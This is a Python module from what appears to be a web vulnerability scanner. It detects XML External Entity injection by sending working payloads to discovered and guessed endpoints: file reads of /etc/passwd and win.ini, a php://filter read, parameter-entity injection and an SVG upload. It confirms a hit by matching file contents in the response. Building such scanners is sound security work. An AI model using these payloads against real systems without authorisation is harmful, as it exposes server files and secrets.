"""
XXE (XML External Entity) Detection Module

Tests for:
1. Classic XXE — file read via DTD entities
2. Blind XXE — out-of-band via external DTD
3. XXE via file upload (SVG, DOCX, XLSX)
4. XXE in SOAP/XML APIs
5. Parameter entity injection
"""
import asyncio
import re
import logging

import httpx

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)

# XXE payloads for file read
XXE_FILE_READ = [
    # Classic XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root>&xxe;</root>', ["root:", "bin:", "daemon:"]),
    # Alternative DTD syntax
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
     '<root>&xxe;</root>', []),
    # Windows
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<root>&xxe;</root>', ["[fonts]", "[extensions]"]),
    # PHP filter
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
     '"php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
     ["cm9vd"]),  # base64 of "root"
]

# XXE for parameter entities (bypass restrictions)
XXE_PARAM_ENTITY = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
    '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///dev/null/%%xxe;\'>">'
    '%eval;%exfil;]><root>test</root>',
]

# XXE in different content types
XXE_CONTENT_TYPES = [
    ("application/xml", "xml"),
    ("text/xml", "xml"),
    ("application/soap+xml", "soap"),
    ("application/json", "json_to_xml"),  # Some parsers accept XML even with JSON content-type
]

# SVG XXE payload
SVG_XXE = '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>'''


class XXEModule:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def check(self, context: dict, db) -> list[dict]:
        """Run XXE checks on XML-accepting endpoints."""
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        findings = []

        headers = {}
        if auth_cookie:
            if auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = auth_cookie

        async with make_client(extra_headers=headers) as client:
            # 1. Find XML/SOAP endpoints
            xml_endpoints = self._find_xml_endpoints(endpoints, base_url)
            logger.info(f"XXE: Found {len(xml_endpoints)} potential XML endpoints")

            for ep in xml_endpoints[:10]:
                result = await self._test_xxe(client, ep)
                if result:
                    findings.append(result)

            # 2. Test content-type switching on API endpoints
            api_endpoints = [ep for ep in endpoints if isinstance(ep, str) and "/api/" in ep]
            for ep in api_endpoints[:5]:
                result = await self._test_content_type_switch(client, ep)
                if result:
                    findings.append(result)

            # 3. Test SVG XXE on upload endpoints
            upload_endpoints = self._find_upload_endpoints(endpoints, base_url)
            for ep in upload_endpoints[:3]:
                result = await self._test_svg_xxe(client, ep)
                if result:
                    findings.append(result)

        return findings

    def _find_xml_endpoints(self, endpoints, base_url) -> list[str]:
        """Find endpoints that might accept XML."""
        xml_eps = []
        xml_keywords = ("xml", "soap", "wsdl", "api", "rpc", "service", "ws",
                        "graphql", "feed", "rss", "atom", "import", "parse")
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if any(k in url.lower() for k in xml_keywords):
                xml_eps.append(url)

        # Also try common XML endpoints
        for path in ["/api/xml", "/soap", "/ws", "/xmlrpc.php", "/api/import",
                     "/upload", "/api/parse", "/api/v1", "/api/v2"]:
            xml_eps.append(f"{base_url}{path}")

        return xml_eps

    def _find_upload_endpoints(self, endpoints, base_url) -> list[str]:
        """Find file upload endpoints."""
        upload_eps = []
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if any(k in url.lower() for k in ("upload", "import", "file", "image", "avatar")):
                upload_eps.append(url)
        return upload_eps

    async def _test_xxe(self, client, url) -> dict | None:
        """Test XXE payloads against an endpoint."""
        for payload, indicators in XXE_FILE_READ:
            for content_type, _ in XXE_CONTENT_TYPES:
                try:
                    async with self.rate_limit:
                        resp = await client.post(
                            url,
                            content=payload,
                            headers={"Content-Type": content_type},
                        )
                        if resp.status_code in (200, 500):
                            body = resp.text
                            if indicators:
                                if any(ind in body for ind in indicators):
                                    logger.info(f"XXE confirmed: {url} — file read successful")
                                    return {
                                        "title": f"XXE — File Read via {content_type}",
                                        "url": url,
                                        "severity": "critical",
                                        "vuln_type": "xxe",
                                        "payload": payload[:200],
                                        "content_type": content_type,
                                        "response_preview": body[:500],
                                        "impact": "XML External Entity injection allows reading server files. "
                                                 "Attacker can read /etc/passwd, application config, source code.",
                                        "remediation": "Disable DTD processing and external entities in the XML parser.",
                                    }
                            else:
                                # No specific indicators — check if response is different from error
                                if len(body) > 50 and "error" not in body.lower()[:100]:
                                    return {
                                        "title": f"Potential XXE via {content_type}",
                                        "url": url,
                                        "severity": "high",
                                        "vuln_type": "xxe",
                                        "payload": payload[:200],
                                        "response_preview": body[:300],
                                    }
                except Exception:
                    continue
        return None

    async def _test_content_type_switch(self, client, url) -> dict | None:
        """Test if JSON endpoint also accepts XML (content-type confusion)."""
        xxe_payload = (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root><data>&xxe;</data></root>'
        )
        try:
            async with self.rate_limit:
                # First try as JSON to see normal response
                json_resp = await client.post(url, json={"test": "1"})

                # Then try as XML
                xml_resp = await client.post(
                    url, content=xxe_payload,
                    headers={"Content-Type": "application/xml"},
                )

                if xml_resp.status_code in (200, 500):
                    body = xml_resp.text
                    if any(ind in body for ind in ["root:", "bin:", "daemon:"]):
                        return {
                            "title": f"XXE via Content-Type Switching: {url}",
                            "url": url,
                            "severity": "critical",
                            "vuln_type": "xxe",
                            "payload": xxe_payload[:150],
                            "impact": "API accepts XML despite expecting JSON. XXE allows file read.",
                        }
        except Exception:
            pass
        return None

    async def _test_svg_xxe(self, client, url) -> dict | None:
        """Test XXE via SVG file upload."""
        try:
            async with self.rate_limit:
                files = {"file": ("test.svg", SVG_XXE, "image/svg+xml")}
                resp = await client.post(url, files=files)
                if resp.status_code in (200, 201):
                    body = resp.text
                    if any(ind in body for ind in ["root:", "bin:", "daemon:"]):
                        return {
                            "title": f"XXE via SVG Upload: {url}",
                            "url": url,
                            "severity": "critical",
                            "vuln_type": "xxe",
                            "payload": "SVG with XXE entity",
                            "impact": "SVG file upload processes XML entities — file read via SVG.",
                        }
        except Exception:
            pass
        return None
